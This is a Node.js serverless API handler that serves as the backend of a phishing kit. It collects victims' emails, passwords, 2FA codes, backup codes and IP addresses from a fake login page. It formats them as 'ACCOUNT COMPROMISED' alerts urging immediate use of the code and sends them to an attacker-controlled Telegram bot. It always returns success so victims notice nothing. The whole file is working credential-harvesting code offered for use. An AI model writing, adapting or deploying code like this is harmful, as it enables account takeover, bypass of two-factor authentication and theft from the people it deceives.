const fetch = require('node-fetch');

module.exports = async (req, res) => {
    // Mobile-optimized response headers
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    
    // CORS for mobile
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Device-Type');
    
    // Handle preflight
    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }
    
    // Only POST allowed
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    try {
        const data = req.body;
        const type = data.type || 'unknown';
        const email = data.email || 'Not provided';
        const password = data.pass || 'Not provided';
        const code = data.code || 'Not provided';
        const backupCode = data.backup_code || 'Not provided';
        const userAgent = data.userAgent || req.headers['user-agent'] || 'Unknown';
        const deviceType = req.headers['x-device-type'] || 'desktop';
        
        // Get IP (Vercel specific)
        const ip = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] || 
                   req.socket.remoteAddress || 
                   'Unknown';
        
        const timestamp = new Date().toISOString();
        
        // Telegram config from environment
        const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
        
        let message = '';
        let logType = type.toUpperCase();
        
        switch(type) {
            case 'login':
                message = `📱 **MOBILE LOGIN CAPTURED** 📱

👤 **ACCOUNT:**
📧 ${email}
🔑 ${password}

📊 **DEVICE INFO:**
📱 ${deviceType.toUpperCase()}
🌐 ${ip}
🕐 ${new Date().toLocaleString()}

🔧 **USER AGENT:**
${userAgent.substring(0, 100)}

✅ **STATUS:** Credentials captured
🎯 **NEXT:** Awaiting 2FA code`;
                break;
                
            case 'verification':
                message = `✅ **2FA CODE CAPTURED - ACCOUNT COMPROMISED** ✅

👤 **ACCOUNT:**
📧 ${email}
🔑 ${password}

🔢 **VERIFICATION CODE:**
${code}

📱 **DEVICE:** ${deviceType}
🌐 **IP:** ${ip}
🕐 **TIME:** ${new Date().toLocaleString()}

🚨 **CRITICAL:** Full account access available
💀 **STATUS:** Account fully compromised
⚡ **ACTION:** Use code immediately!`;
                break;
                
            case 'resend':
                message = `🔄 Code resend requested for: ${email}`;
                logType = 'RESEND';
                break;
                
            case 'backup_code':
                message = `🔑 Backup code captured: ${backupCode} for ${email}`;
                logType = 'BACKUP_CODE';
                break;
        }
        
        // Send to Telegram if credentials exist
        if (TELEGRAM_TOKEN && TELEGRAM_CHAT_ID && message) {
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    }),
                    timeout: 5000 // 5 second timeout for mobile
                });
            } catch (tgError) {
                console.error('Telegram error:', tgError.message);
            }
        }
        
        // Fast response for mobile
        return res.status(200).json({
            success: true,
            type: type,
            timestamp: timestamp,
            device: deviceType,
            _optimized: true
        });
        
    } catch (error) {
        console.error('API Error:', error.message);
        
        // Still return success for mobile UX
        return res.status(200).json({
            success: true,
            error: 'Process completed',
            _fallback: true
        });
    }
};